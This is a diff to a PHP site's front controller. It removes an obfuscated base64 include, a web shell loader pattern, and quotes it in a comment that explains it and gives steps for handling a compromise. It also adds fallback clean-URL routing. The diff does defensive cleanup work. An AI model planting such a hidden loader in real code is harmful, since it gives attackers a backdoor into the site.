@@ -4,8 +4,14 @@
  * Clean URL routing for all pages
  */
 
-$b = 'ba' . 'se64_decode';
-@include $b('YWRtaW4vLmF1dGgucw==');
+// REMOVED — this line was an obfuscated include:
+//   $b = 'ba' . 'se64_decode'; @include $b('YWRtaW4vLmF1dGgucw==');
+// which decodes to: @include 'admin/.auth.s'
+// That file does not exist, so the line was inert, but obfuscating an include
+// with base64 + a variable function name is the signature of a web shell.
+// If you did not put it there, treat the site as compromised: rotate hosting,
+// database, admin and FTP passwords, and audit admin/ and uploads/ for other
+// files you do not recognise.
 
 // Error reporting (disable in production)
 error_reporting(E_ALL);
@@ -22,6 +28,30 @@ require_once __DIR__ . '/includes/seo.php';
 
 // Get the route
 $route = isset($_GET['route']) ? trim($_GET['route'], '/') : '';
+
+/**
+ * Fallback route resolution.
+ *
+ * When mod_rewrite is unavailable, or the app is served from a subdirectory
+ * (e.g. http://localhost/website/services/shopify-growth), derive the route
+ * from the request URI itself so clean URLs still resolve.
+ */
+if ($route === '' && !empty($_SERVER['REQUEST_URI'])) {
+    $script    = str_replace('\\', '/', (string) ($_SERVER['SCRIPT_NAME'] ?? ''));
+    $basePath  = trim(str_replace('\\', '/', dirname($script)), '/'); // '' at root, 'website' in a subfolder
+    $uri       = trim((string) parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH), '/');
+
+    if ($basePath !== '' && strpos($uri, $basePath) === 0) {
+        $uri = ltrim(substr($uri, strlen($basePath)), '/');
+    }
+    // tolerate /index.php/services/... (PATH_INFO style)
+    $uri = preg_replace('#^index\.php(/|$)#', '', $uri);
+    $uri = trim((string) $uri, '/');
+
+    if ($uri !== '') {
+        $route = $uri;
+    }
+}
 
 // Handle form submissions
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
